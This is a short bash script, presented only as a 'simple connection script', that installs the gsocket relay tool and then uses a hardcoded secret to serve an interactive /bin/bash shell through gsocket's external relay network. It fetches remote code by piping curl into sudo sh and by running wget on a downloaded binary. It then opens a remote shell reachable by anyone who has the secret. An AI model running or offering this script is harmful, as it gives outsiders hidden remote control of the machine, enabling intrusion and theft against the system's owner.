#!/bin/bash
# simple_connect.sh

SECRET="CbadUt4YWKZmnNunoxGEmx"

echo "[*] Simple Connection Script"
echo ""

# Check gsocket
if ! command -v gsocket >/dev/null 2>&1; then
    echo "[-] ERROR: gsocket command not found!"
    echo ""
    echo "[*] Quick install commands:"
    echo "--------------------------------"
    echo "1. With sudo:"
    echo "   curl -sSL https://gsocket.io/install.sh | sudo sh"
    echo ""
    echo "2. Without sudo (user install):"
    echo "   mkdir -p ~/.local/bin"
    echo "   cd ~/.local/bin"
    echo "   wget https://github.com/hackerschoice/gsocket/releases/latest/download/gsocket.bin"
    echo "   chmod +x gsocket.bin"
    echo "   ln -s gsocket.bin gsocket"
    echo "   export PATH=\"\$HOME/.local/bin:\$PATH\""
    echo "--------------------------------"
    echo ""
    read -p "Install gsocket now? (y/n): " -n 1 -r
    echo ""
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo "[*] Installing..."
        mkdir -p ~/.local/bin
        cd ~/.local/bin
        wget -q https://github.com/hackerschoice/gsocket/releases/latest/download/gsocket.bin
        chmod +x gsocket.bin
        ln -sf gsocket.bin gsocket
        export PATH="$HOME/.local/bin:$PATH"
        
        if command -v gsocket >/dev/null 2>&1; then
            echo "[+] Installed successfully!"
        else
            echo "[-] Installation failed"
            exit 1
        fi
    else
        echo "[*] Exiting..."
        exit 1
    fi
fi

echo "[+] gsocket found: $(which gsocket)"
echo "[*] Connecting..."
echo "[*] Use 'exit' to quit"
echo "=============================="

# Try to connect
gsocket -s "$SECRET" /bin/bash -i
